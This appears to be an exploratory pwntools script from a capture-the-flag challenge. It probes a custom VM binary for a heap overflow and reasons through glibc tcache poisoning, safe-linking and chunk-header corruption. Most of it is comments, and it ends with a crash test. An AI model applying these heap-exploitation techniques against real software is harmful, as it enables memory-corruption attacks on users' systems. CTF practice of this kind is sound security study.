#!/usr/bin/env python3
"""
Tcache poisoning attempt.

In glibc 2.35 with tcache safe-linking, even if we can write to next chunk's fd,
we need to bypass the XOR protection: fd = (actual_fd ^ (chunk_addr >> 12))

The exploit flow:
1. Allocate several pages (fills tcache when freed)
2. Trigger cleanup by setting pages to all-zeros
3. New allocations will come from tcache
4. If we can corrupt tcache fd before allocation...

Actually, the cleanup only frees pages with all-zero data.
Writes will keep pages alive.

The tricky part: during final cleanup (after execution), ALL pages are freed.
If we've corrupted prev_size, the chunk consolidation might fail.

Let me check if we can corrupt prev_size AND the PREV_INUSE bit in size.
"""
from pwn import *

context.log_level = 'error'

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def store_mem_reg(dest_reg, src_reg):
    return bytes([0x61, dest_reg, src_reg])

def hlt():
    return bytes([0x00])

# Key insight: page chunks are malloc(0x104) -> 0x110 size chunks
# These go into tcache 0x110 (up to 7 entries)

# During final cleanup, pages are freed in order of the page array
# If we corrupt one chunk's metadata, the free might corrupt tcache

# The PREV_INUSE bit is at offset 0x108 of the chunk (in size field)
# We can only write up to 0x106 with PUSH

# Alternative: use STORE with cross-page write
# STORE can write 4 bytes, split across page boundary
# If first page ends at chunk boundary, second page write might be in next chunk

# Actually let me think about this differently...
# The vm_state is a small chunk (0x50 bytes -> 0x60 chunk)
# Pages are 0x110 chunks
# If we can somehow get vm_state adjacent to a page...

# vm_state is allocated first, then code page
# vm_state chunk: calloc(1, 0x50) -> chunk size 0x60
# code page: malloc(0x104) -> chunk size 0x110

# These are in different size classes, so they won't be adjacent normally

print("[*] Analyzing heap layout for exploitation")

# Let's try a simpler approach: corrupt a page's header (the 4-byte address)
# If we can make two pages have the same address, they would overlap in the page table

code_addr = 0x10000
code = b''
code += mov_reg_imm(15, 0x200FF)  # SP with low byte 0xFF
code += mov_reg_imm(0, 0x10000)   # Target address (same as code!)
code += push_reg(0)               # Write 0x10000 at page[0x103..0x106]
code += hlt()

# If the write goes into the NEXT chunk's header area (offset 4 from chunk start),
# we could corrupt another page's VM address field!

# Chunk layout after malloc(0x104):
# Offset 0x00-0x03: 4-byte VM address header
# Offset 0x04-0x103: 256 bytes data
# -- chunk boundary --
# Next chunk at offset 0x110

# So page[0x103..0x106] = bytes 0x103-0x106 of usable area
# This is NOT in the next chunk yet

print("[*] Cannot corrupt next chunk with PUSH at offset 0xFF")
print("[*] The write is still within the usable 0x108 bytes")

# What if the malloc_usable_size is EXACTLY 0x104?
# Let's verify by checking if PUSH at SP=0x200FF crashes

print("[*] Testing PUSH at offset 0xFF...")

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(code)).encode())
p.recvuntil(b'Code> ')
p.send(code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())

output = p.recvall(timeout=2)
print(f"[*] Output: {output}")
p.close()

# The fact that it doesn't crash confirms usable_size >= 0x107
